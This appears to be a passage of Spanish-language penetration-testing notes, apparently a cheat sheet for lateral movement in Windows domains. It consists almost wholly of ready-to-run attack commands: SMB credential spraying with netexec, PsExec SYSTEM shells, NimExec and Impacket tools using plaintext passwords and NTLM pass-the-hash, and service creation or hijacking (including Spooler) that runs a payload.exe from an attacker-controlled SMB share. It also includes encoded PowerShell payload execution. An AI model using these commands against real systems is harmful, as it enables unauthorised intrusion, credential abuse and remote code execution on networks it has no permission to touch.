...
netexec smb 172.20.0.0/24 -u helen -p 'Password123!' -d domain.local

# Listar shares
netexec smb 172.20.0.52 -u helen -p 'Password123!' --shares
```
...
.\PsExec.exe \\SRV02 -i -u DOMAIN\helen -p Password123! cmd

# Shell como SYSTEM
.\PsExec.exe \\SRV02 -i -s -u DOMAIN\helen -p Password123! cmd

# Ejecutar comando directo sin shell interactiva
.\PsExec.exe \\SRV02 -u DOMAIN\helen -p Password123! cmd /c whoami
```
...
.\SharpNoPSExec.exe --target=172.20.0.52 --username=helen --password=Password123! --domain=domain.local --payload="cmd.exe /c <payload>"
...
```c
# Con contraseña
.\NimExec.exe -u helen -d domain.local -p Password123! -t 172.20.0.52 -c "cmd.exe /c powershell -e <base64>"

# Con hash NTLM
.\NimExec.exe -u helen -d domain.local -h 62EBA30320E250ECA185AA1327E78AEB -t 172.20.0.52 -c "cmd.exe /c <payload>"

# Verbose
.\NimExec.exe -u helen -d domain.local -p Password123! -t 172.20.0.52 -c "cmd.exe /c <payload>" -v

# Especificar servicio concreto
.\NimExec.exe -u helen -d domain.local -p Password123! -t 172.20.0.52 -s ALG -c "cmd.exe /c <payload>"
```
...
```c
proxychains4 -q psexec.py DOMAIN/helen:'Password123!'@172.20.0.52

# Con hash
proxychains4 -q psexec.py DOMAIN/helen@172.20.0.52 -hashes :62EBA30320E250ECA185AA1327E78AEB
```
...
```c
proxychains4 -q smbexec.py DOMAIN/helen:'Password123!'@172.20.0.52

# Con hash
proxychains4 -q smbexec.py DOMAIN/helen@172.20.0.52 -hashes :62EBA30320E250ECA185AA1327E78AEB
```
...
```c
# Listar servicios
proxychains4 -q services.py DOMAIN/helen:'Password123!'@172.20.0.52 list

# Crear servicio nuevo
proxychains4 -q services.py DOMAIN/helen:'Password123!'@172.20.0.52 create -name 'MyService' -display 'MyService' -path "\\\\10.10.14.207\\share\\payload.exe"

# Ver config de un servicio
proxychains4 -q services.py DOMAIN/helen:'Password123!'@172.20.0.52 config -name 'MyService'

# Iniciar servicio
proxychains4 -q services.py DOMAIN/helen:'Password123!'@172.20.0.52 start -name 'MyService'

# Modificar servicio existente (cambiar binary path + auto start)
proxychains4 -q services.py DOMAIN/helen:'Password123!'@172.20.0.52 change -name Spooler -path "\\\\10.10.14.207\\share\\payload.exe" -start_type 2

# Iniciar el servicio modificado
proxychains4 -q services.py DOMAIN/helen:'Password123!'@172.20.0.52 start -name Spooler

# Eliminar servicio
proxychains4 -q services.py DOMAIN/helen:'Password123!'@172.20.0.52 delete -name 'MyService'
```
...
proxychains4 -q atexec.py DOMAIN/helen:'Password123!'@172.20.0.52 "powershell -e <base64_payload>"

# Con hash
proxychains4 -q atexec.py DOMAIN/helen@172.20.0.52 -hashes :62EBA30320E250ECA185AA1327E78AEB "whoami"
```
